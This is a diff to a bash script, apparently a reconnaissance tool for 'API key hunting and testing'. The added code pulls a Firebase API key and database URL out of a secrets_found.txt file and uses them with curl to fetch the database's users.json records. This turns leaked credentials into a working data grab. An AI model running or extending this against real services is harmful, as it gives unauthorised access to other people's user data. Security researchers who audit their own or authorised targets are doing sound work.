@@ -668,6 +668,22 @@ test_firebase_appId() {
     fi
 }
 
+# New function to fetch data from Firebase Realtime Database
+fetch_firebase_data() {
+    local api_key="$1"
+    local db_url="$2"
+    # Construct endpoint (using 'users.json' as an example)
+    local endpoint="${db_url}/users.json?auth=${api_key}"
+    echo "Fetching Firebase data from: ${endpoint}"
+    local result
+    result=$(curl -s "$endpoint")
+    if command -v jq >/dev/null 2>&1; then
+        echo "$result" | jq
+    else
+        echo "$result"
+    fi
+}
+
 echo "Starting API key hunting and testing..."
 
 # Extract and test keys for each type
@@ -721,4 +737,19 @@ extract_and_test "securitytrails_key" "SecurityTrails API Keys" test_securitytra
 sed -i '/===.*===/{N;/===.*===\n$/d}' "$output_file"
 echo "Process complete. Results saved to $output_file"
 cat "$output_file"
-# === End of Key Testing Section ===
+
+
+# After key testing, extract Firebase keys directly from the secrets file
+grep "^firebase_api_key ->" secrets_found.txt
+grep "^firebase_databaseURL ->" secrets_found.txt
+
+firebase_api_key_found=$(grep "^firebase_api_key ->" secrets_found.txt | head -n 1 | sed -nE "s/^firebase_api_key -> apiKey:'([^']+)'[[:space:]]*$/\1/p")
+firebase_databaseURL_found=$(grep "^firebase_databaseURL ->" secrets_found.txt | head -n 1 | sed -nE "s/^firebase_databaseURL -> databaseURL:'([^']+)'[[:space:]]*$/\1/p")
+echo "Extracted Firebase API key: '$firebase_api_key_found'"
+echo "Extracted Firebase Database URL: '$firebase_databaseURL_found'"
+if [[ -n "$firebase_api_key_found" && -n "$firebase_databaseURL_found" ]]; then
+    fetch_firebase_data "$firebase_api_key_found" "$firebase_databaseURL_found"
+else
+    echo "Firebase API key and/or Database URL not found in secrets."
+fi
+# ...existing code...
